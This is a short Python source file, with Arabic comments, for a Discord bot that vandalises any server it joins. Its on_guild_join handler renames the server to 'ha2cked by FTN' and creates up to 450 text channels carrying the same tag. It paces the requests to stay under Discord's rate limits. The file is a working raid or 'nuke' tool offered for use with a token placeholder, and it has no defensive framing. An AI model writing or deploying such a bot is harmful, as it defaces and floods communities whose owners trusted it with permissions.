import asyncio
import discord
from discord.ext import commands

# إعداد الصلاحيات (Intents)
intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name} (ID: {bot.user.id})")
    print("Bot is ready and running!")

@bot.event
async def on_guild_join(guild):
    target_name = "ha2cked by FTN"
    
    # 1. تغيير اسم السيرفر
    try:
        await guild.edit(name=target_name)
        print(f"Successfully renamed guild to: {target_name}")
    except Exception as e:
        print(f"Failed to rename guild: {e}")

    # 2. إنشاء الرومات تلقائياً
    # الحد الأقصى للرومات في سيرفر ديسكورد هو 500 روم، لذا سنحدد العدد بـ 450 لتجنب تجاوز الحد الأقصى
    max_channels = 450
    created_count = 0

    for i in range(max_channels):
        try:
            # ديسكورد يتطلب أن تكون أسماء الرومات النصية بحروف صغيرة وشرطات (أو سيتم تعديلها تلقائياً)
            channel_name = f"ha2cked-by-ftn-{i+1}"
            await guild.create_text_channel(name=channel_name)
            
            # فاصل زمني بسيط جداً لتجنب حظر الـ Rate Limit من ديسكورد
            await asyncio.sleep(0.4)
            created_count += 1
        except discord.HTTPException as e:
            print(f"Reached limit or rate limited at channel {i+1}: {e}")
            break
        except Exception as e:
            print(f"Error creating channel: {e}")
            break

    print(f"Finished setup. Created {created_count} channels in {guild.name}.")

# استبدل 'YOUR_BOT_TOKEN' بتوكن بوت الخاص بك
bot.run("YOUR_BOT_TOKEN")

